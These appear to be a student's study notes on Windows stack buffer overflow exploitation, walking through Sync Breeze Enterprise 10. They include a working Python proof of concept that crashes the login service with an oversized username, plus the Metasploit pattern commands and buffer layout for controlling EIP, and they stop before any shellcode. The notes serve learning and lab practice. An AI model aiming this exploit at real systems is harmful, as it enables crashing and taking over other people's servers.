## Windows Summary
1. Find input fields to the program
Use a script to recreate packet and spam variable input
2. Fuzz (give long strings to) any inputs to create a crash/error, locating a vulnerable input
3. Overflow to EIP (instruction pointer), verifiable using a debugger on the program process
4. Find space for shellcode ie. overflow into as much memory space as possible
5. Find a jump instruction to a register in the overflow space eg. JMP ESP
6. Point EIP to that instruction address (must be in a static location)
7. Overflow shellcode into the pointed to space. 

NOP Sleds

### Limited ESP space? 
Use jump code to access in ESP space to get to another overflowable register space

### DEP (Data Execution Prevention)
Hardware and software memory checks to prevent malicious code. Raises an exception when loads from data pages are attempted.

### ASLR (Address Space Layout Randomization)
Randomizes base addresses of programs and DLLs every time the OS is booted.

### CFG (Control Flow Guard)
Microsoft's version of CFI (Control Flow Integrity), validates indirect code branches (like a call to a register) to prevent overwrite of function pointers

# Sync Breeze Example

### Sync Breeze Vulnerability
A buffer overflow was found in the username field of the HTTP POST login request
**Pre-Authentication Buffer Overflow**

Methods for discovering buffer overflow
1. Source code review (if available)
2. Reverse engineering
3. Fuzzing

Python proof of concept:
```
#!/usr/bin/python
import socket
import sys

try:
  server = sys.argv[1]
  port = 80
  size = 800
  inputBuffer = b"A" * size
  content = b"username=" + inputBuffer + b"&password=A"

  buffer = b"POST /login HTTP/1.1\r\n"
  buffer += b"Host: " + server.encode() + b"\r\n"
  buffer += b"User-Agent: Mozilla/5.0 (X11; Linux_86_64; rv:52.0) Gecko/20100101 Firefox/52.0\r\n"
  buffer += b"Accept: text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8\r\n"
  buffer += b"Accept-Language: en-US,en;q=0.5\r\n"
  buffer += b"Referer: http://10.11.0.22/login\r\n"
  buffer += b"Connection: close\r\n"
  buffer += b"Content-Type: application/x-www-form-urlencoded\r\n"
  buffer += b"Content-Length: "+ str(len(content)).encode() + b"\r\n"
  buffer += b"\r\n"
  buffer += content

  print("Sending evil buffer...")
  s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
  s.connect((server, port))
  s.send(buffer)
  s.close()
  
  print("Done!")
  
except socket.error:
  print("Could not connect!")
```

### Install Sync Breeze Enterprise 10
- Run from installer
- Options -> Sever -> Enable web access on port 80
- Attach WinDbg (run as admin)
- Keep services.msc up to restart the service when it dies
- `g` to continue service

### Crash Sync Breeze
- Run the Python POC from a VPN connected device
- Inspect the memory and error as an "Access Violation"
- This proves that data has overflowed into the EIP

### Control EIP
- Binary tree analysis to isolate EIP; 400 A's, 400 B's. EIP is written with B's, send 400 A's, 200 B's, 200 C's, etc.
- Or, send a long, non-repeating string of 4 byte chunks, `msf-pattern_create -l 800`
 [[Metasploit]] -> `msf-pattern_offset -l 800 -q 42306142` > `Exact match of offset 780`
 - Edit script buffer with:
 ```
 filler = b"A" * 780
 eip = b"B" * 4
 buffer = b"C" * 16
 overflow = filler + eip + buffer
```

### Redirect Application Flow
- generate shellcode to be included in the buffer
- ESP points to our buffer of C's at crash time, put it there
-  